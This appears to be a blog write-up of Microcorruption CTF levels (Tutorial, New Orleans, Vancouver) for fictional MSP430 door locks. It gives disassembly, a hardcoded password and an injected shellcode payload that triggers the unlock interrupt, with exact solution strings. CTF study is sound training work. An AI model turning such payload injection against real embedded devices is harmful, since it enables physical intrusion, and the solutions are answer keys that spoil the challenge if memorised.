---
title: Microcontroller CTF
---
# Microcontroller CTF

## Description
[Microcontroller CTF](https://microcorruption.com) is a web-based CTF site
focused on binary exploitation of embedded devices, particularly fictional door
locks using the MSP430 architecture, developed by Texas Instruments. The
web debugger is "connected" to a lock via JTAG.

An instruction set cheatsheet can be found [here](https://alexmilenkovich.github.io/teaching/files/MSP430InstructionSet_CheatSheet.pdf).

The site is organized by locations across the world and saves progress in the
browser. Problems have generated solutions, meaning that a valid input one time
may not work another time. However, the process of finding the valid input remains
the same.

The site also contains a combined
[assembler/disassembler](https://microcorruption.com/assembler), the [lock
manual](https://microcorruption.com/public/manual.pdf), and some MSP430
manuals, which are useful for specific problems.

I'll be solving these and updating this blogpost incrementally.

## Problems

## Tutorial
The binary only checks for the length of the password. Any 8-byte string (9, counting the terminating null-byte) works.

Solution: `12345678`

## New Orleans
The password is located in the `create_password` function:

```
447e <create_password>
447e:  3f40 0024      mov	#0x2400, r15
4482:  ff40 7700 0000 mov.b	#0x77, 0x0(r15)
4488:  ff40 5c00 0100 mov.b	#0x5c, 0x1(r15)
448e:  ff40 7900 0200 mov.b	#0x79, 0x2(r15)
4494:  ff40 4c00 0300 mov.b	#0x4c, 0x3(r15)
449a:  ff40 5800 0400 mov.b	#0x58, 0x4(r15)
44a0:  ff40 6800 0500 mov.b	#0x68, 0x5(r15)
44a6:  ff40 7d00 0600 mov.b	#0x7d, 0x6(r15)
44ac:  cf43 0700      mov.b	#0x0, 0x7(r15)
44b0:  3041           ret
```


In this case, the password in hex bytes is `775c794c58687d`.

## Vancouver
I'm not sure why this one was unlocked when it's so far below in the order.

The revision indicates that the binary includes debugging
user-input payloads. Its example is ASCII `8000023041`, saved to 0x2400:
```
2400: 3830 3030 3032 3330 3431 0000 0000 0000   8000023041......
```

The payload is then placed at address 0x3830:
```
3830: 3030 3233 3034 3100 0000 0000 0000 0000   0023041
```

Within the disassembly, we can see that the code is executed
starting at 0x2403:
```
448e:  0d4a           mov	r10, r13
4490:  3e40 0324      mov	#0x2403, r14
4494:  0f4b           mov	r11, r15
4496:  b012 fc44      call	#0x44fc <memcpy>
449a:  8b12           call	r11
```

Therefore, we can create our payload at an arbitrary location using the disassembler
and run it!

On page 4 of the lock manual, it says that interrupt 0x7f unlocks the lock. Therefore,
we can use the disassembler to call INT(0x7f):
```
push #0x7f
call #0x44a8
```

This gives us the bytes `30127f00b012a844`. Knowing that `383030` worked for the example
payload, we can now send `38303030127f00b012a844`.

Solution: `38303030127f00b012a844`
